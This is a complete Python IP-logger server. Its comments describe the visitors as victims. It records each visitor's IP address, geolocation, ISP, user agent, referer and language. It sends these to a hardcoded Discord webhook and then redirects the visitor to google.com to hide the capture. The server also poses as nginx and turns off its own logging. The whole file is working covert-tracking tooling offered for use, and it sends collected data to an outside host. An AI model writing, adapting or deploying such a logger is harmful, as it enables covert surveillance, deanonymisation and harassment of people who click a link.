import json
import time
import urllib.request
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# --- CONFIG ---
# Paste your webhook here (keep the quotes)
WEBHOOK_URL = "https://discord.com/api/webhooks/1565255316474433616/WLY35n1OinXDZo6F4wzYOouatW2DudjgS08O_xpiJ-ud1zXPeJls2Yr1_SS5G8zpVXoa".strip()
# Where the victim goes after you log them (change this to a real site)
REDIRECT_URL = "https://google.com"
# --- CONFIG ---

def geo_lookup(ip: str) -> dict:
    if ip.startswith(("127.", "10.", "192.168.", "172.16.")):
        return {}
    try:
        with urllib.request.urlopen(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,query",
            timeout=4,
        ) as r:
            return json.loads(r.read().decode())
    except Exception:
        return {}

def send_webhook(embed: dict) -> None:
    payload = json.dumps({"embeds": [embed]}).encode()
    req = urllib.request.Request(
        WEBHOOK_URL,
        data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        method="POST",
    )
    try:
        urllib.request.urlopen(req, timeout=6).read()
    except Exception as e:
        print(f"[!] webhook failed: {e}")

class Handler(BaseHTTPRequestHandler):
    server_version = "nginx"
    sys_version = ""

    def log_message(self, *args):
        pass

    def do_GET(self):
        ip = self.headers.get("X-Forwarded-For", self.client_address[0]).split(",")[0].strip()
        ua = self.headers.get("User-Agent", "unknown")
        referer = self.headers.get("Referer", "none")
        accept_lang = self.headers.get("Accept-Language", "none")
        geo = geo_lookup(ip)

        geo_str = ""
        if geo:
            geo_str = (
                f"{geo.get('city','?')}, {geo.get('regionName','?')}, {geo.get('country','?')}\n"
                f"ISP: {geo.get('isp','?')}\n"
                f"ASN: {geo.get('as','?')}"
            )

        embed = {
            "title": "New hit",
            "color": 0x2b2d31,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "fields": [
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "Path", "value": f"`{self.path}`", "inline": True},
                {"name": "Geo", "value": geo_str or "unavailable", "inline": False},
                {"name": "User-Agent", "value": f"```{ua[:1000]}```", "inline": False},
                {"name": "Referer", "value": f"`{referer}`", "inline": False},
                {"name": "Language", "value": f"`{accept_lang}`", "inline": True},
            ],
            "footer": {"text": "relay"},
        }
        send_webhook(embed)

        self.send_response(302)
        self.send_header("Location", REDIRECT_URL)
        self.end_headers()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    srv = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    print(f"[+] listening on port {port}")
    srv.serve_forever()
